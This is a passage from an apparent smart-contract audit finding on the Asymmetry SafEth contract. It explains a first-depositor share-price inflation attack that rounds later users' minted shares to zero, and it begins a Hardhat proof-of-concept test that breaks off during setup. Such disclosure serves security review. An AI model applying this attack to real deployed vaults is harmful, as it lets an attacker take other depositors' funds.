In the worst case, an attacker can steal all the funds of the next user.\n\n### Proof of Concept\n\nWhen the first user enters totalSupply is set to 1e18 on [L79](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L79):\n\n```solidity\nif (totalSupply == 0)\n            preDepositPrice = 10 ** 18; // initializes with a price of 1\n        else preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply;\n```\n\nBut the user can immediately unstake most of his safETH such that totalSupply <<  1e18. The attacker can then transfer increase the underlying amount by transferring derivative tokens to the derivative contracts.\n\nFor subsequent users, the preDepositPrice will be heavily inflated and the calculation of mintAmount on [L98](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98):\n\n```solidity\nuint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice;\n```\n\ncan be very inaccurate. In the worst case it rounds down to 0 for users that deposit value that is less than the value that the attacker transferred in.\n\nIn the following POC the attacker steals all of the second user's deposit. The attacker first deposits 100 ETH and immediately removes all but 1 wei. The attacker then transfers 10 wsETH to the WstEth contract. When the second user enters with 1.5 ETH no additional safETH are minted since the minAmount is rounded down to 0. The attacker has all of the safTokens and can withdraw 100% of deposits.\n\nCreate a new test file with the following content to run the POC.\n\n```solidity\nimport { SafEth } from \"../typechain-types\";\n\nimport { ethers, upgrades, network } from \"hardhat\";\nimport { expect } from \"chai\";\nimport {\n  getAdminAccount,\n  getUserAccounts,\n  getUserBalances,\n  randomStakes,\n  randomUnstakes,\n} from \"./helpers/integrationHelpers\";\nimport { getLatestContract } from \"./helpers/upgradeHelpers\";\nimport { BigNumber } from \"ethers\";\n\nimport ERC20 from \"@openzeppelin/contracts/build/contracts/ERC20.json\";\nimport { RETH_MAX, WSTETH_ADRESS, WSTETH_WHALE } from \"./helpers/constants\";\n\ndescribe.only(\"SafEth POC\", function () {\n  let safEthContractAddress: string;\n  let strategyContractAddress: string;\n  // create string array\n  let derivativesAddress: string[] = [];\n  let startingBalances: BigNumber[];\n  let networkFeesPerAccount: BigNumber[];\n  let totalStakedPerAccount: BigNumber[];\n\n  before(async () => {\n    startingBalances = await getUserBalances();\n    networkFeesPerAccount = startingBalances.map(() => BigNumber.from(0));\n    totalStakedPerAccount = startingBalances.map(() => BigNumber.from(0));\n  });\n\n  it(\"Should deploy the strategy contract\", async function () {\n    const safEthFactory = await ethers.getContractFactory(\"SafEth\");\n    const strategy = (await upgrades.deployProxy(safEthFactory, [\n      \"Asymmetry Finance ETH\",\n      \"safETH\",\n    ])) as SafEth;\n    await strategy.deployed();\n\n    strategyContractAddress = strategy.address;\n\n    const owner = await strategy.owner();\n    const derivativeCount = await strategy.derivativeCount();\n\n    expect(owner).eq((await getAdminAccount()).address);\n    expect(derivativeCount).eq(\"0\");\n  });\n\n  it(\"Should deploy derivative contracts and add them to the strategy contract with equal weights\", async function () {\n    const supportedDerivatives = [\"Reth\", \"SfrxEth\", \"WstEth\"];\n    const strategy = await getLatestContract(strategyContractAddress, \"SafEth\");\n\n    for (let i = 0;
